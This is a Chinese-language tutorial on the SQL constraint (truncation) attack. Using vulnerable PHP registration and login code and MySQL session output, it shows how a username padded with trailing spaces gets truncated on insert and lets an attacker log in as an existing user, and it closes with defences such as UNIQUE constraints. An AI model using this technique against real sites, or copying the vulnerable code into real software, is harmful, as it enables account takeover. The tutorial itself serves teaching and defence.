# SQL约束攻击

## 介绍

值得庆幸的是如今开发者在构建网站时，已经开始注重安全问题了。绝大部分开发者都意识到SQL注入漏洞的存在，在本文我想与读者共同去探讨另一种与SQL数据库相关的漏洞，其危害与SQL注入不相上下，但却不太常见。接下来，我将为读者详细展示这种攻击手法，以及相应的防御策略。

## 目的

任意用户登录

## 原理

**数据库字符串比较**：在数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:``[String]``和字符串B:``[String2]``进行比较时，由于``String2``比``String``多了一个字符串，这时MySQL会将字符串A填充为``[String ]``，即在原来字符串后面加了一个空格，使两个字符串长度一致。看如下两条查询语句：

```sql
select * from users where username='Dumb'
select * from users where username='Dumb    '
```

它们的查询结果是一致的，即第二条查询语句中Dumb后面的空格并没有对查询有任何影响。因为在MySQL把查询语句里的``username``和数据库里的``username``值进行比较时，它们就是一个字符串的比较操作，符合上述特征。

**INSERT截断**：这是数据库的另一个特性，当设计一个字段时，我们都必须对其设定一个最大长度，比如``CHAR(10)``，``VARCHAR(20)``等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。

## 利用条件

1. **服务端没有对用户名长度进行限制**。如果服务端限制了用户名长度就不能导致数据库截断，也就没有利用条件。
2. **登陆验证的SQL语句必须是用户名和密码一起验证**。如果是验证流程是先根据用户名查找出对应的密码，然后再比对密码的话，那么也不能进行利用。因为当使用``Dumb``为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条则是目标用户的记录，那么你传输的密码肯定是和目标用户密码匹配不上的。
3. **验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名**。因为当我们以用户``Dumb``和密码``123456``登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是[Dumb      ]，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。
4. **用户名中可以使用空格**

## 测试条件

## 基础&背景

最近，我遇到了一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问。当新用户尝试注册时，将运行以下代码：

```php
<?php
// Checking whether a user with the same username exists
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT *
          FROM users
          WHERE username='$username'";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0) {
    // User exists, exit gracefully
    .
    .
  }
  else {
    // If not, only then insert a new entry
    $query = "INSERT INTO users(username, password)
              VALUES ('$username','$password')";
    .
    .
  }
}

```

使用以下代码验证登录信息：

```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
          WHERE username='$username'
              AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0){
      $row = mysql_fetch_assoc($res);
      return $row['username'];
  }
}
return Null;

```

安全考虑:

> - 过滤用户输入参数了吗？ — 完成检查
> - 使用单引号（’）来增加安全性了吗？ — 完成检查

按理说应该不会出错了啊？

然而，攻击者依然能够以任意用户身份进行登录！

## 利用过程

在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。

1. 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说``“vampire”``等同于``“vampire ”``，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。

   ```sql
   SELECT * FROM users WHERE username='vampire     ';
   ```

   但也存在异常情况，最好的例子就是``LIKE``子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在[内部](https://support.microsoft.com/en-in/kb/316626)使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。

2. 在所有的INSERT查询中，SQL都会根据``varchar(n)``来限制字符串的最大长度。也就是说，如果字符串的长度大于``n``个字符的话，那么仅使用字符串的前``n``个字符。比如特定列的长度约束为``5``个字符，那么在插入字符串``vampire``时，实际上只能插入字符串的前5个字符，即``“vampi``”。

现在，让我们建立一个测试数据库来演示具体攻击过程。

```mysql
vampire@linux:~$ mysql -u root -p
mysql> CREATE DATABASE testing;
Query OK, 1 row affected (0.03 sec)
mysql> USE testing;
Database changed
```

接着创建一个数据表``users``，其包含``username``和``password``列，并且字段的最大长度限制为25个字符。然后，我将向``username``字段插入``vampire``，向``password``字段插入``my_password``。

```mysql
mysql> CREATE TABLE users (
    ->   username varchar(25),
    ->   password varchar(25)
    -> );
Query OK, 0 rows affected (0.09 sec)
mysql> INSERT INTO users
    -> VALUES('vampire', 'my_password');
Query OK, 1 row affected (0.11 sec)
mysql> SELECT * FROM users;
+----------+-------------+
| username | password    |
+----------+-------------+
| vampire  | my_password |
+----------+-------------+
1 row in set (0.00 sec)

```

为了展示尾部空白字符的修剪情况，我们可以键入下列命令：

```mysql
mysql> SELECT * FROM users
    -> WHERE username='vampire       ';
+----------+-------------+
| username | password    |
+----------+-------------+
| vampire  | my_password |
+----------+-------------+
1 row in set (0.00 sec)

```

现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为``“vampire”``），只需要使用用户名``“vampire[许多空白符]1”``和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含``vampire``和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。

```
mysql> SELECT * FROM users
    -> WHERE username='vampire                   1';
Empty set (0.00 sec)

```

需要注意的是，在执行``SELECT``查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行``INSERT``查询语句时，它只会插入前25个字符。

```mysql
mysql>   INSERT INTO users(username, password)
    -> VALUES ('vampire                   1', 'random_pass');
Query OK, 1 row affected, 1 warning (0.05 sec)
mysql> SELECT * FROM users
    -> WHERE username='vampire';
+---------------------------+-------------+
| username                  | password    |
+---------------------------+-------------+
| vampire                   | my_password |
| vampire                   | random_pass |
+---------------------------+-------------+
2 rows in set (0.00 sec)

```

很好，现在我们检索``“vampire”``的，将返回两个独立用户。注意，第二个用户名实际上是``“vampire”``加上尾部的18个空格。现在，如果使用用户名``“vampire”``和密码``“random_pass”``登录的话，则所有搜索该用户名的``SELECT``查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。

## 原理详解

我们把利用场景设在用户登陆的地方，假如有用户``[Dumb]``，我们想要使用他的账号登陆，但是我们又不知道他的密码，那么我们可以注册一个名字叫``[Dumb          done]``的用户，即在目标用户名的后面加一串空格（注意：空格后需再跟一个或多个任意字符，防止程序在检查用户名是否已存在时匹配到目标用户），空格的长度要超过数据库字段限制的长度，让其强制截断。

当我们注册该用户名后，由于截断的问题，此时我们的用户名就为``[Dumb       ]``，即除了后面的一串空格，我们的用户名和目标用户名一样。

假如服务端的用户登陆代码为：

```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
          WHERE username='$username'
              AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0){
      return $username;//此处较原文有改动
  }
}
return Null;
?>
```

从一般SQL注入的角度看，这段代码是不能注入的，但是当我们以目标用户名Dumb和我们自己注册用户的密码进行登陆时就可以绕过认证。当我们以用户名:[Dumb]和密码:[123456]（假设）登陆时，对应的SQL语句就为：

```sql
SELECT username FROM users WHERE username='Dumb' AND password='123456'
```

当执行这条语句后，数据库将返回我们自己注册的账户信息，但是注意此处的``return $username``，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。

## 问题探究

## 安全方案

毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：

1. 将要求或者预期具有唯一性的那些列加上``UNIQUE``约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于``’username’``列具有``UNIQUE``约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且``INSERT``查询将失败。
2. 最好使用``id``作为数据库表的主键。并且数据应该通过程序中的``id``进行跟踪
3. 为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）

## 常见问题

## 其他

